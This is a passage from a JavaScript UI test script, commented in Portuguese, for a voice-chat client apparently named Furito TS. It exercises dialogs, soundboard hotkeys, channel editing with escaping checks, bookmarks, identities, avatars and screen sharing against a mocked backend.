      fire(row('server', 0), 'contextmenu', { button: 2 });
      chk('srvMenu', $('ctxMenu').textContent.includes('Grupos e permissões'));
      closePopover();

      // ausente com mensagem (Enter confirma)
      $('tbAway').click(); await wait(20);
      let d = topDlg();
      chk('awayDlg', !!d && d.classList.contains('dyn'));
      d.querySelector('.f-text').value = 'almoço';
      d.querySelector('.f-text').dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', bubbles: true, cancelable: true }));
      await wait(30);
      chk('away', state.self.away && state.self.awayMessage === 'almoço' && openModals.length === 0, state.self.awayMessage);
      $('tbAway').click(); await wait(30);
      chk('back', !state.self.away && openModals.length === 0);

      // cutucada recebida: texto do servidor escapado; Esc fecha
      onPoke({ fromName: 'Zé <i>Pequeno</i>', message: 'bora?' });
      d = topDlg();
      chk('poke', !!d && d.textContent.includes('Zé <i>Pequeno</i>') && !d.querySelector('.dlg-text i'));
      key('keydown', 'Escape');
      chk('pokeEsc', openModals.length === 0);
      // opção de não abrir janela na cutucada: desligada, fica só o aviso sonoro e a linha no registro
      {
        const toggle = async () => { $('tbSettings').click(); await wait(20); $('setPokePopup').click(); await wait(20); $('setClose').click(); await wait(20); };
        const wasOn = state.pokePopup === true;
        const linesBefore = tabs.get('server').view.querySelectorAll('.line').length;
        await toggle();
        await call('PokeClient', 3, 'oi'); await wait(1100);
        const quiet = openModals.length === 0 && state.pokePopup === false;
        const logged = tabs.get('server').view.textContent.includes('cutucou você') && tabs.get('server').view.querySelectorAll('.line').length > linesBefore;
        await toggle();
        await call('PokeClient', 3, 'oi'); await wait(1100);
        const popup = openModals.length === 1 && state.pokePopup === true && topDlg().textContent.includes('cutucou');
        if (openModals.length) topDlg()._dismiss();
        chk('pokeOption', wasOn && quiet && logged && popup, JSON.stringify({ wasOn, quiet, logged, popup }));
      }
      // sobre: botão ao lado dos ajustes, com versão, autor e site; os ajustes não repetem isso
      {
        $('tbAbout').click(); await wait(30);
        const open = !$('dlgAbout').hidden && topDlg() === $('dlgAbout');
        const link = $('aboutAuthor').querySelector('a[data-url]');
        const text = $('aboutVersion').textContent.includes(state.appVersion) && state.appVersion === '1.0.0' &&
          $('aboutAuthor').textContent.includes('Diogo Agra') && !!link && link.dataset.url.indexOf('https://diogoagra.dev') === 0;
        key('keydown', 'Escape'); await wait(30);
        const closed = $('dlgAbout').hidden && openModals.length === 0;
        chk('about', open && text && closed && !$('dlgSettings').textContent.includes('Diogo Agra'), JSON.stringify({ open, text, closed }));
      }
      // supressão de ruído: liga/desliga e o tipo (neural ou clássica)
      {
        const pick = async (value) => { $('nsMode').value = value; $('nsMode').dispatchEvent(new Event('change', { bubbles: true })); await wait(30); };
        const start = state.audio.noiseSuppression === true && state.audio.noiseMode === 'neural' && !$('nsModeRow').hidden && $('nsHint').textContent.includes('digitação');
        await pick('classic');
        const classic = state.audio.noiseMode === 'classic' && $('nsMode').value === 'classic' && $('nsHint').textContent.includes('constante');
        $('optNS').click(); await wait(30);
        const off = state.audio.noiseSuppression === false && state.audio.noiseMode === 'classic' && $('nsModeRow').hidden && $('nsHint').hidden;
        $('optNS').click(); await wait(30);
        await pick('neural');
        const back = state.audio.noiseSuppression === true && state.audio.noiseMode === 'neural' && !$('nsModeRow').hidden;
        chk('noiseMode', start && classic && off && back, JSON.stringify({ start, classic, off, back }));
      }
      // sensibilidade da detecção de voz: o controle, a calibração e os outros modos
      {
        const slide = async (pos) => { $('vadFloorSlider').value = String(pos); $('vadFloorSlider').dispatchEvent(new Event('input', { bubbles: true })); await wait(900); };
        const mode = async (value) => { document.querySelector('input[name="vadMode"][value="' + value + '"]').click(); await wait(30); };
        const start = state.audio.vadMode === 'auto' && state.audio.vadFloor === 0 && !$('vadFloorRow').hidden && !$('vadFloorSlider').hidden &&
          $('vadSlider').hidden && $('vadFloorValue').textContent === 'sem mínimo' && $('vadFloorHint').hidden;
        await slide(500);
        const half = floorFromPos(0.5);
        const set = state.audio.vadFloor === half && $('vadFloorValue').textContent === String(half) && $('vadFloorHint').hidden;
        $('vadCalibrate').click(); await wait(30);
        const busy = $('vadCalibrate').disabled && $('vadFloorSlider').disabled && $('vadCalibrate').textContent.includes('Ouvindo') && !$('vadFloorHint').hidden && $('vadFloorHint').textContent.includes('Fale normalmente');
        await wait(800);
        const done = !$('vadCalibrate').disabled && state.audio.vadFloor === 600 && $('vadFloorValue').textContent === '600' &&
          $('vadFloorSlider').value === String(Math.round(floorPos(600) * 1000)) && !$('vadFloorHint').hidden && $('vadFloorHint').textContent.includes('2400') && $('vadFloorHint').textContent.includes('600');
        await mode('level');
        const hiddenInLevel = $('vadFloorRow').hidden && $('vadFloorSlider').hidden && $('vadFloorHint').hidden && !$('vadSlider').hidden;
        await mode('auto');
        await slide(0);
        const off = state.audio.vadFloor === 0 && $('vadFloorValue').textContent === 'sem mínimo' && !$('vadFloorRow').hidden;
        chk('vadFloor', start && set && busy && done && hiddenInLevel && off, JSON.stringify({ start, set, busy, done, hiddenInLevel, off }));
      }
      // importar um pacote de sons de avisos
      {
        const before = (state.audio.notifyPacks || []).length;
        $('notifyImport').click(); await wait(40);
        chk('packImport', state.audio.notifyPacks.length === before + 1 && state.audio.notifyPack === 'importado' && state.audio.notifySounds === true && tabs.get('server').view.textContent.includes('Pacote de sons importado'), state.audio.notifyPacks.length + ' ' + state.audio.notifyPack);
      }
      // soundboard: a grade ocupa a largura do painel e cada som aceita um atalho
      {
        for (let i = 0; i < 9; i++) await call('SoundboardAddFiles');
        await wait(20);
        showPopover($('popSoundboard'), $('tbSoundboard')); await wait(20);
        const pads = Array.from($('sbPads').querySelectorAll('.pad'));
        const box = $('sbPads').getBoundingClientRect();
        const cols = new Set(pads.map((p) => Math.round(p.getBoundingClientRect().left))).size;
        const right = Math.max(...pads.map((p) => p.getBoundingClientRect().right));
        const inWindow = $('popSoundboard').getBoundingClientRect().right <= window.innerWidth && $('popSoundboard').getBoundingClientRect().left >= 0;
        chk('sbLayout', pads.length >= 10 && cols >= 4 && box.right - right < 12 && inWindow, pads.length + ' sons em ' + cols + ' colunas; sobra ' + Math.round(box.right - right) + 'px');
        $('sbPads').querySelector('.pad-key').click(); await wait(20);
        const capturing = !!hkCapture && $('popSoundboard').hidden;
        key('keydown', 'F13'); await wait(30);
        const chip = $('sbPads').querySelector('.pad .pad-hk');
        chk('sbHotkey', capturing && state.audio.sounds[0].hotkey === 'F13' && !!chip && chip.textContent === 'F13' && !$('popSoundboard').hidden, JSON.stringify(state.audio.sounds[0]));
        closePopover();
        key('keydown', 'F13'); await wait(20); // sem atalhos globais (modo demonstração) vale com a janela em foco
        const played = state.audio.soundboardPlaying === true;
        await call('SetHotkey', 'soundStop', 'F15'); await wait(20);
        key('keydown', 'F15'); await wait(20);
        chk('sbHotkeyPlay', played && state.audio.soundboardPlaying === false, played + '/' + state.audio.soundboardPlaying);
        // o mesmo atalho em outro som é recusado, e o motivo aparece
        showPopover($('popSoundboard'), $('tbSoundboard')); await wait(20);
        $('sbPads').querySelectorAll('.pad-key')[1].click(); await wait(20);
        key('keydown', 'F13'); await wait(30);
        chk('sbHotkeyDup', !state.audio.sounds[1].hotkey && !!$('sbPads').querySelectorAll('.pad')[1].querySelector('.pad-hk.err') && tabs.get('server').view.textContent.includes('já está em uso'), JSON.stringify(state.audio.sounds[1]));
        // remover o atalho pelo mesmo diálogo
        $('sbPads').querySelector('.pad-key').click(); await wait(20);
        const removeBtn = document.querySelector('.modal.dyn [data-key="hk-remove"]');
        if (removeBtn) removeBtn.click();
        await wait(30);
        chk('sbHotkeyRemove', !!removeBtn && state.audio.sounds[0].hotkey === '' && !$('sbPads').querySelector('.pad .pad-hk:not(.err)') && !hkCapture);
        closePopover();
        await call('SetHotkey', 'soundStop', '');
      }

      // volume, mute local e contatos
      await call('SetClientVolume', 4, 150); await call('SetClientMuted', 4, true);
      await call('SetContact', 4, 'friend'); await call('SetContact', 5, 'blocked');
      await wait(20);
      select('client', 4, true);
      const vs = $('info').querySelector('.cl-vol');
      chk('volume', !!vs && vs.value === '150' && findClient(4).volume === 150 && $('info').textContent.includes('Amigo'), vs && vs.value);
      chk('marks', !!row('client', 4).querySelector('.cmark.friend') && !!row('client', 4).querySelector('.sicon.local') && !!row('client', 5).querySelector('.cmark.blocked'));

      // arrastar um cliente para outro canal (com a janela pequena o destino pode estar fora da área visível da árvore)
      row('channel', 6).scrollIntoView({ block: 'nearest' });
      const from = row('client', 5).getBoundingClientRect(), to = row('channel', 6).getBoundingClientRect();
      fire(row('client', 5), 'mousedown', { clientX: from.left + 40, clientY: from.top + 8 });
      document.dispatchEvent(new MouseEvent('mousemove', { bubbles: true, clientX: to.left + 60, clientY: to.top + 8 }));
      const highlighted = row('channel', 6).classList.contains('drop-target');
      document.dispatchEvent(new MouseEvent('mouseup', { bubbles: true, clientX: to.left + 60, clientY: to.top + 8 }));
      await wait(30);
      chk('drag', highlighted && findClient(5).channelId === 6 && !document.querySelector('.drag-ghost'), highlighted + '/' + findClient(5).channelId);

      // sussurro: indicador na barra de status, clique para parar
      await call('SetWhisperTarget', 'client', 3); await wait(20);
      chk('whisper', !$('whisperIndicator').hidden && $('whisperIndicator').textContent.includes('Zé Pequeno'));
      $('whisperIndicator').click(); await wait(20);
      chk('whisperOff', $('whisperIndicator').hidden);

      // criar, editar e apagar canal
      channelEditor(null, 0);
      d = topDlg();
      d.querySelector('.f-name').value = 'Sala <Teste>';
      d.querySelector('.f-topic').value = 'tópico';
      d.querySelector('.btn.primary').click(); await wait(40);
      let made = state.channels.find((c) => c.name === 'Sala <Teste>');
      chk('chCreate', !!made && openModals.length === 0 && made.topic === 'tópico');
      chk('chEscaped', !!made && row('channel', made.id).innerHTML.includes('Sala &lt;Teste&gt;'));
      channelEditor(made, 0); await wait(260);
      d = topDlg();
      chk('chPrefill', !!d && d.querySelector('.f-name').value === 'Sala <Teste>' && d.querySelector('.f-kind').value === 'temporary' && d.querySelector('.f-pw').disabled);
      d.querySelector('.f-name').value = 'Sala Editada'; d.querySelector('.f-kind').value = 'permanent';
      d.querySelector('.btn.primary').click(); await wait(40);
      made = findChannel(made.id);
      chk('chEdit', !!made && made.name === 'Sala Editada' && made.isPermanent && openModals.length === 0);
      channelEditor(null, 0);
      d = topDlg();
      d.querySelector('.f-name').value = 'Sala Editada';
      d.querySelector('.btn.primary').click(); await wait(40);
      chk('chError', topDlg() === d && d.querySelector('.dlg-error').textContent !== '', d.querySelector('.dlg-error').textContent);
      d._dismiss();
      deleteChannel(made);
      d = topDlg();
      d.querySelector('.btn.danger').click(); await wait(40);
      chk('chDelete', !findChannel(made.id) && openModals.length === 0);

      // grupos
      await call('AddServerGroup', 4, 9); await call('SetChannelGroup', 4, 6); await wait(20);
      chk('groups', findClient(4).serverGroupIds.includes(9) && findClient(4).channelGroupId === 6);

      // grupos e permissões
      const pd = openPermissions(); await wait(40);
      const pnames = () => pd.qa('.perm-rows tr[data-name]').map((tr) => tr.dataset.name);
      const n0 = pnames().length;
      pd.q('.f-pname').value = 'i_teste_power'; pd.q('.f-pval').value = '7'; pd.q('.f-padd').click(); await wait(40);
      const added = pnames().includes('i_teste_power');
      pd.q('.f-pname').value = 'permissão inválida'; pd.q('.f-padd').click(); await wait(40);
      const perr = pd.q('.dlg-error').textContent !== '';
      pd.q('.perm-rows tr[data-name="i_teste_power"] .rm').click(); await wait(40);
      chk('perms', n0 > 0 && added && perr && !pnames().includes('i_teste_power'), n0 + '/' + added + '/' + perr);
      pd.close();

      // arquivos do canal
      openFiles(findChannel(3)); await wait(40);
      d = topDlg();
      const frows = () => d.querySelectorAll('.fb-rows tr[data-i]');
      const f0 = frows().length;
      fire(frows()[0], 'dblclick'); await wait(40);
      chk('files', f0 >= 2 && d.querySelector('.fb-path').textContent.includes('mapas') && frows().length >= 1, f0);
      d._dismiss();

      // favoritos
      const b0 = state.bookmarks.length;
      const bid = await call('SaveBookmark', { id: '', name: 'Teste', host: 'ts.exemplo.org', nickname: 'Eu', defaultChannel: '' }); await wait(20);
      const bd = openBookmarks();
      const listed = bd.qa('.bm-list .list-item').length;
      bd.q('.f-new').click();
      bd.q('.f-name').value = 'Via Enter'; bd.q('.f-host').value = 'enter.exemplo.org';
      bd.q('.f-host').dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', bubbles: true, cancelable: true })); await wait(30);
      const viaEnter = state.bookmarks.find((b) => b.host === 'enter.exemplo.org');
      const selItem = bd.q('.bm-list .list-item.selected .t');
      chk('bmEnter', !!viaEnter && openModals.includes(bd.el) && !!selItem && selItem.textContent === 'Via Enter');
      if (viaEnter) await call('DeleteBookmark', viaEnter.id);
      await call('DeleteBookmark', bid); await wait(20);
      chk('bookmarks', state.bookmarks.length === b0 && listed === b0 + 1 && bd.qa('.bm-list .list-item').length === b0, listed);
      bd.close();
      $('tbBookmarks').click();
      chk('bmMenu', !$('ctxMenu').hidden && $('ctxMenu').textContent.includes('Gerenciar favoritos'));
      closePopover();

      // ajustes: modo de transmissão, atalho e apertar para falar
      $('tbSettings').click();
      chk('settings', !$('dlgSettings').hidden && $('hkRows').querySelectorAll('.hk-row').length === 4 && $('setIn').options.length >= 2 && $('setUid').textContent.length > 5);
      // uma aba por assunto: só a escolhida aparece, as setas andam entre elas e a janela reabre na última usada
      {
        const stabs = Array.from($('setTabs').querySelectorAll('.set-tab'));
        const shown = () => Array.from($('dlgSettings').querySelectorAll('.set-pane')).filter((p) => !p.hidden).map((p) => p.dataset.pane).join(',');
        const vis = (id) => $(id).getClientRects().length > 0;
        chk('settingsTabs', stabs.length === 6 && shown() === 'audio' && stabs[0].classList.contains('active') && stabs[0].getAttribute('aria-selected') === 'true' && vis('setIn') && !vis('hkRows') && !vis('setIdList'), shown());
        stabs[5].click();
        chk('settingsTabClick', shown() === 'identities' && vis('setIdList') && !vis('setIn') && stabs[5].tabIndex === 0 && stabs[0].tabIndex === -1, shown());
        $('setTabs').dispatchEvent(new KeyboardEvent('keydown', { key: 'ArrowRight', bubbles: true, cancelable: true }));
        const wrapped = shown();
        $('setTabs').dispatchEvent(new KeyboardEvent('keydown', { key: 'ArrowRight', bubbles: true, cancelable: true }));
        chk('settingsTabKeys', wrapped === 'audio' && shown() === 'hotkeys' && document.activeElement === stabs[1], wrapped + ' ' + shown());
        key('keydown', 'Escape'); $('tbSettings').click();
        chk('settingsTabRemembered', !$('dlgSettings').hidden && shown() === 'hotkeys' && vis('hkRows'), shown());
        stabs[0].click(); $('setOpenCapture').click(); await wait(30);
        chk('settingsToMicPanel', $('dlgSettings').hidden && !$('popCapture').hidden);
        closePopover(); $('tbSettings').click();
      }
      const pttRadio = document.querySelector('input[name="vadModeS"][value="ptt"]');
      pttRadio.checked = true; pttRadio.dispatchEvent(new Event('change', { bubbles: true })); await wait(20);
      $('hkRows').querySelector('[data-hk="ptt"]').click();
      key('keydown', 'ShiftLeft', { key: 'Shift', shiftKey: true });
      const stillWaiting = !!hkCapture;
      key('keydown', 'F13', { ctrlKey: true }); await wait(20);
      chk('hotkey', stillWaiting && state.audio.vadMode === 'ptt' && state.hotkeys.ptt === 'Ctrl+F13' && $('hkRows').textContent.includes('⌃ F13'), state.hotkeys.ptt);
      $('setNick').value = 'Novo Nome'; $('setNickApply').click(); await wait(20);
      chk('nick', state.self.nickname === 'Novo Nome');
      key('keydown', 'Escape');
      chk('settingsEsc', $('dlgSettings').hidden && openModals.length === 0);
      key('keydown', 'F13', { ctrlKey: true });
      const held = pttHeld;
      key('keyup', 'F13');
      chk('ptt', held && !pttHeld);

      // histórico: linhas esmaecidas e um separador antes da primeira linha ao vivo
      const cv = tabs.get('channel').view;
      chk('history', cv.querySelectorAll('.line.hist').length >= 1 && cv.querySelectorAll('.hist-sep').length === 1 && tabs.get('channel').unread === 0);

      // menu do próprio cliente: apelido e pedido de palavra
      changeNickname(); d = topDlg();
      d.querySelector('.f-text').value = 'Furico Dois'; d.querySelector('.btn.primary').click(); await wait(30);
      chk('selfNick', state.self.nickname === 'Furico Dois' && openModals.length === 0);
      requestTalk(); d = topDlg();
      d.querySelector('.f-text').value = 'por favor'; d.querySelector('.btn.primary').click(); await wait(30);
      chk('talkReq', state.self.talkRequested && !!row('client', state.self.clientId).querySelector('.gicon[title="Pediu a palavra: por favor"]'));
      await call('SetClientTalker', state.self.clientId, true); await wait(20);
      chk('talker', !state.self.talkRequested && findClient(state.self.clientId).isTalker);

      // moderação pelos diálogos
      kickClient(findClient(6), false); d = topDlg();
      d.querySelector('.f-text').value = 'motivo'; d.querySelector('.btn.danger').click(); await wait(30);
      chk('kickCh', findClient(6).channelId === 1 && openModals.length === 0, findClient(6).channelId);
      banDialog(findClient(6)); d = topDlg();
      d.querySelector('.f-dur').value = '0'; d.querySelector('.btn.danger').click(); await wait(30);
      chk('ban', !findClient(6) && openModals.length === 0);
      pokeClient(findClient(3)); d = topDlg();
      d.querySelector('.btn.primary').click(); await wait(1000);
      d = topDlg();
      chk('pokeBack', !!d && d.textContent.includes('cutucou você'));
      if (d) d._dismiss();
      volumeDialog(findClient(3)); d = topDlg();
      const sl = d.querySelector('.f-vol');
      sl.value = '60'; sl.dispatchEvent(new Event('input', { bubbles: true })); await wait(120);
      chk('volDlg', findClient(3).volume === 60 && d.querySelector('.f-pct').textContent === '60%', findClient(3).volume);
      d._dismiss();

      // arquivos: enviar, selecionar, apagar (com confirmação)
      openFiles(findChannel(3)); await wait(40);
      d = topDlg();
      const fcount = () => d.querySelectorAll('.fb-rows tr[data-i]').length;
      const f1 = fcount();
      Array.from(d.querySelectorAll('.dlg-foot .btn')).find((b) => b.textContent.indexOf('Enviar') === 0).click(); await wait(40);
      const f2 = fcount();
      fire(d.querySelector('.fb-rows tr[data-i]:last-child'), 'click');
      const canDownload = !d.querySelector('[data-key="dl"]').disabled;
      d.querySelector('[data-key="rm"]').click(); await wait(20);
      topDlg().querySelector('.btn.danger').click(); await wait(40);
      chk('fileOps', f2 === f1 + 1 && canDownload && fcount() === f1 && topDlg() === d, f1 + '/' + f2 + '/' + fcount());
      d._dismiss();

      // ajustes: dispositivos, reconexão, limpar atalho, identidade e histórico
      $('tbSettings').click();
      $('setOut').value = $('setOut').options[2].value; $('setOut').dispatchEvent(new Event('change', { bubbles: true }));
      $('setReconnect').click(); await wait(20);
      chk('devices', state.audio.outputChoice === 'Fones de ouvido externos' && state.autoReconnect === false && !$('setReconnect').checked, state.audio.outputChoice);
      $('hkRows').querySelector('[data-hk-clear="toggleMute"]').click(); await wait(20);
      chk('hkClear', state.hotkeys.toggleMute === '' && $('hkRows').querySelector('[data-hk-clear="toggleMute"]').disabled);
      $('setImprove').click(); d = topDlg();
      d.querySelector('.f-text').value = '10'; d.querySelector('.btn.primary').click(); await wait(30);
      const busy = !$('setSpinner').hidden && $('setImprove').disabled;
      await wait(1600);
      chk('improve', busy && state.identity.securityLevel === 10 && $('setLevel').textContent === '10' && $('setSpinner').hidden && !$('setImprove').disabled, state.identity.securityLevel);
      $('setPrivKey').click(); d = topDlg();
      d.querySelector('.f-text').value = 'x'; d.querySelector('.btn.primary').click(); await wait(30);
      chk('privKeyErr', $('setError').textContent !== '');
      $('setExport').click(); await wait(20);
      chk('export', $('setInfo').textContent.includes('furito-identidade') && $('setError').textContent === '');
      $('setClearHistory').click(); d = topDlg();
      d.querySelector('.btn.danger').click(); await wait(30);
      chk('clearHist', document.querySelectorAll('.line.hist, .hist-sep').length === 0 && $('setInfo').textContent.includes('apagado'));
      $('setClose').click();

      // atalho de mutar alto-falantes com a janela em foco
      await call('SetHotkey', 'toggleDeafen', 'Alt+KeyD'); await wait(20);
      key('keydown', 'KeyD', { altKey: true }); await wait(20);
      const deaf = state.self.deafened;
      key('keydown', 'KeyD', { altKey: true }); await wait(20);
      chk('hkToggle', deaf === true && state.self.deafened === false);

      // moderação
      await call('KickClient', 7, true, 'teste'); await wait(20);
      chk('kick', !findClient(7));

      // queda de conexão: "reconectando", depois volta sozinho
      if (api._mockDrop) {
        api._mockDrop(); await wait(20);
        chk('reconnecting', state.status === 'reconnecting' && $('tree').textContent.includes('Reconectando') && /tentativa 1/.test($('statusText').textContent), $('statusText').textContent);
        await wait(900);
        chk('reconnected', state.status === 'connected');
      }

      // os diálogos cabem na janela (botão Fechar sempre à vista) e arrastam pelo título
      $('tbSettings').click(); await wait(20);
      {
        const dlg = $('dlgSettings').querySelector('.dialog');
        const inView = (el) => { const r = el.getBoundingClientRect(); return r.top >= 0 && r.left >= 0 && r.bottom <= window.innerHeight && r.right <= window.innerWidth && r.height > 0; };
        const body = dlg.querySelector('.dlg-content');
        chk('dlgFits', inView($('setClose')) && inView(dlg.querySelector('.dlg-title')) && dlg.getBoundingClientRect().bottom <= window.innerHeight && body.scrollHeight >= body.clientHeight,
          Math.round(dlg.getBoundingClientRect().bottom) + '/' + window.innerHeight + ' miolo ' + body.clientHeight + '/' + body.scrollHeight);
        const title = dlg.querySelector('.dlg-title');
        const r0 = dlg.getBoundingClientRect();
        const at = { clientX: r0.left + r0.width / 2, clientY: r0.top + 10 };
        const mouse = (target, type, x, y) => target.dispatchEvent(new MouseEvent(type, { bubbles: true, cancelable: true, button: 0, clientX: x, clientY: y }));
        mouse(title, 'mousedown', at.clientX, at.clientY);
        mouse(document, 'mousemove', at.clientX + 60, at.clientY + 30);
        mouse(document, 'mouseup', at.clientX + 60, at.clientY + 30);
        const r1 = dlg.getBoundingClientRect();
        const moved = Math.round(r1.left - r0.left) === 60 && Math.round(r1.top - r0.top) === 30;
        // arrastar para muito longe: o título continua alcançável
        mouse(title, 'mousedown', r1.left + r1.width / 2, r1.top + 10);
        mouse(document, 'mousemove', 9000, 9000);
        mouse(document, 'mouseup', 9000, 9000);
        const r2 = title.getBoundingClientRect();
        const reachable = r2.left <= window.innerWidth - 40 && r2.bottom <= window.innerHeight + 0.5 && r2.top >= 0;
        $('setClose').click(); await wait(20);
        $('tbSettings').click(); await wait(20);
        const r3 = dlg.getBoundingClientRect();
        chk('dlgDrag', moved && reachable && Math.round(r3.left) === Math.round(r0.left) && Math.round(r3.top) === Math.round(r0.top),
          JSON.stringify({ moved, reachable, voltou: [Math.round(r3.left), Math.round(r3.top)], era: [Math.round(r0.left), Math.round(r0.top)] }));
        // um diálogo criado na hora (como o da cutucada) também arrasta
        onPoke({ fromName: 'Zé Pequeno', message: 'teste' }); await wait(20);
        const pd = document.querySelector('.modal.dyn .dialog');
        const p0 = pd.getBoundingClientRect();
        mouse(pd.querySelector('.dlg-title'), 'mousedown', p0.left + 50, p0.top + 10);
        mouse(document, 'mousemove', p0.left + 10, p0.top + 70);
        mouse(document, 'mouseup', p0.left + 10, p0.top + 70);
        const p1 = pd.getBoundingClientRect();
        chk('pokeDrag', Math.round(p1.left - p0.left) === -40 && Math.round(p1.top - p0.top) === 60 && inView(pd.querySelector('.dlg-foot button')), Math.round(p1.left - p0.left) + ',' + Math.round(p1.top - p0.top));
        pd.querySelector('.dlg-foot button').click(); await wait(20);
      }

      // várias identidades: importar entra na lista sem trocar a em uso; tornar padrão vale na próxima conexão
      chk('idList', $('setIdList').querySelectorAll('.list-item').length === 1 && $('setIdList').textContent.includes('padrão') && $('setIdList').textContent.includes('em uso') && $('setIdDelete').disabled && $('setIdDefault').disabled);
      $('setImport').click(); d = topDlg();
      d.querySelector('.btn.primary').click(); await wait(40);
      d = topDlg();
      const askedDefault = !!d && d.textContent.includes('Usuario Normal');
      const stillFirst = state.identity.name === 'Principal' && state.status === 'connected';
      if (d) d.querySelector('.btn.primary').click();
      await wait(40);
      const imp = state.identities.find((x) => x.name === 'Usuario Normal') || {};
      chk('import', askedDefault && stillFirst && state.identities.length === 2 && imp.isDefault === true && imp.inUse === false && state.identity.name === 'Principal' && $('setUid').textContent === imp.uid && $('setLevel').textContent === '11', JSON.stringify(state.identities.map((x) => [x.name, x.isDefault, x.inUse])));
      $('setImport').click(); d = topDlg();
      d.querySelector('.btn.primary').click(); await wait(40);
      chk('importDup', $('setError').textContent.includes('já está na lista') && state.identities.length === 2 && topDlg() === $('dlgSettings'), $('setError').textContent);
      $('setIdNew').click(); d = topDlg();
      d.querySelector('.f-text').value = 'Alt'; d.querySelector('.btn.primary').click(); await wait(40);
      chk('idNew', state.identities.length === 3 && $('setIdList').querySelector('.list-item.selected').textContent.includes('Alt'));
      $('setIdEdit').click(); d = topDlg();
      d.querySelector('.f-name').value = 'Conta 2'; d.querySelector('.f-nick').value = 'Beltrano'; d.querySelector('.btn.primary').click(); await wait(40);
      const alt = state.identities.find((x) => x.name === 'Conta 2') || {};
      chk('idEdit', alt.nickname === 'Beltrano' && $('setIdList').textContent.includes('Beltrano'));
      // a identidade em uso não pode ser apagada com a conexão aberta
      $('setIdList').querySelector('.list-item').click(); await wait(10);
      $('setIdDelete').click(); d = topDlg();
      d.querySelector('.btn.danger').click(); await wait(40);
      chk('idDeleteInUse', $('setError').textContent.includes('em uso') && state.identities.length === 3);
      $('setIdList').querySelectorAll('.list-item')[2].click(); await wait(10);
      $('setIdDelete').click(); d = topDlg();
      d.querySelector('.btn.danger').click(); await wait(40);
      chk('idDelete', state.identities.length === 2 && !state.identities.some((x) => x.name === 'Conta 2'));
      $('setClose').click();
      $('tbDisconnect').click(); await wait(30);
      // janela de conexão: escolher a identidade traz o apelido sugerido dela; o favorito guarda a identidade
      $('tbConnect').click(); await wait(40);
      const idSel = $('cIdentity');
      const hasChoice = !idSel.hidden && idSel.options.length === 3 && idSel.options[0].textContent.includes('Usuario Normal');
      $('cNick').value = '';
      idSel.value = imp.id; idSel.dispatchEvent(new Event('change', { bubbles: true }));
      chk('connIdentity', hasChoice && $('cNick').value === 'Fulano', idSel.options.length + ' ' + $('cNick').value);
      $('cHost').value = 'ts.exemplo.org';
      $('connectOk').click(); await wait(1700);
      chk('connWithIdentity', state.status === 'connected' && state.identity.name === 'Usuario Normal' && state.identities.find((x) => x.inUse).id === imp.id, state.status + ' ' + state.identity.name);
      await call('SetDefaultIdentity', state.identities.find((x) => x.name === 'Principal').id); await wait(20);
      $('tbBookmarks').click(); await wait(20);
      const addItem = Array.from($('ctxMenu').children).find((x) => x.textContent.includes('Adicionar este servidor'));
      if (addItem) addItem.click();
      await wait(40);
      const bmk = state.bookmarks.find((x) => x.host === 'ts.exemplo.org') || {};
      chk('bookmarkIdentity', bmk.identityId === imp.id, JSON.stringify(bmk));
      const me = findClient(state.self.clientId) || {};
      select('client', state.self.clientId, true); await wait(30);
      // avatar: aparece nas informações de quem tem (como as imagens das descrições); quem não tem fica sem o bloco
      select('client', 3, true); await wait(60);
      const av = $('info').querySelector('img.bb-img.avatar');
      chk('avatarShown', !!av && av.src.startsWith('data:image/') && $('info').textContent.includes('Avatar:') && av.closest('.desc') !== null, $('info').textContent.slice(0, 80));
      select('client', 4, true); await wait(60);
      chk('avatarAbsent', !$('info').querySelector('img.avatar') && !$('info').textContent.includes('Avatar:'));
      await call('_mockAvatar', 4, 'novo'); await wait(80);
      const av2 = $('info').querySelector('img.avatar');
      chk('avatarAppears', !!av2 && findClient(4).avatar === 'novo');
      await call('_mockAvatar', 4, 'outro'); await wait(80);
      const av3 = $('info').querySelector('img.avatar');
      chk('avatarChanges', !!av3 && !!av2 && av3.src !== av2.src);
      await call('_mockAvatar', 4, ''); await wait(80);
      chk('avatarRemoved', !$('info').querySelector('img.avatar'));
      select('client', state.self.clientId, true); await wait(30);
      chk('furitoVersion', me.furito === true && $('info').textContent.includes('Furito TS 1.0.0') && !$('info').textContent.includes('Diogo Agra'), me.version + ' ' + me.platform);

      // compartilhamento de tela: o outro cliente simulado compartilha e assiste, com WebRTC de verdade nesta página.
      // Só com ?rtc na URL: conexões de vídeo andam em tempo real, que o relógio acelerado dos testes não espera.
      if (new URLSearchParams(location.search).has('rtc')) {
        const scr = window.FuritoScreen;
        const realWait = async (cond, ms) => { const t0 = performance.now(); while (performance.now() - t0 < ms) { if (await cond()) return true; await new Promise((r) => setTimeout(r, 100)); } return false; };
        $('tbScreen').click(); await wait(40); d = topDlg();
        const warned = !!d && d.textContent.includes('endereço IP');
        if (d) d.querySelector('.btn.primary').click();
        await wait(60); d = topDlg();
        const shareDlg = !!d && !!d.querySelector('.f-quality');
        if (d && shareDlg) d.querySelector('.dlg-foot .btn').click(); // cancela: a captura do navegador pede uma escolha que o teste não faz
        chk('screenWarn', warned && shareDlg && state.screen.warned === true);
        await api._mockPeerShare(true); await wait(120);
        const shareIcon = row('client', 3) && row('client', 3).querySelector('[data-act="watch-screen"]');
        chk('screenIcon', !!shareIcon);
        if (shareIcon) shareIcon.click();
        const live = await realWait(() => { const w = scr.watching(); return !!w && w.state === 'live' && $('svVideo').videoWidth > 0; }, 15000);
        chk('screenWatch', live && !$('screenView').hidden && $('svTitle').textContent.includes('Zé Pequeno'), JSON.stringify(scr.watching()) + ' ' + $('svVideo').videoWidth + 'x' + $('svVideo').videoHeight);
        $('svMax').click(); const maxed = $('screenView').classList.contains('max'); $('svMax').click();
        $('svClose').click(); await wait(60);
        chk('screenClose', maxed && $('screenView').hidden && !scr.watching());
        await api._mockPeerShare(false); await wait(120);
        chk('screenStopped', !row('client', 3).querySelector('[data-act="watch-screen"]'));
        await scr.start({ source: 'pattern-js', quality: 720, fps: 15 });
        const seen = await realWait(async () => (await api._mockPeerReceived()) >= 3, 15000);
        const sh = scr.sharing() || {};
        chk('screenShare', seen && sh.viewers === 1 && !$('screenIndicator').hidden && $('screenIndicator').textContent.includes('1 assistindo') && $('tbScreen').classList.contains('active') && !!row('client', state.self.clientId).querySelector('.sicon.screen.mine'), JSON.stringify(sh));
        $('screenIndicator').click(); await wait(80);
        chk('screenShareStop', !scr.sharing() && $('screenIndicator').hidden && !$('tbScreen').classList.contains('active'));
        // sair do canal encerra o compartilhamento
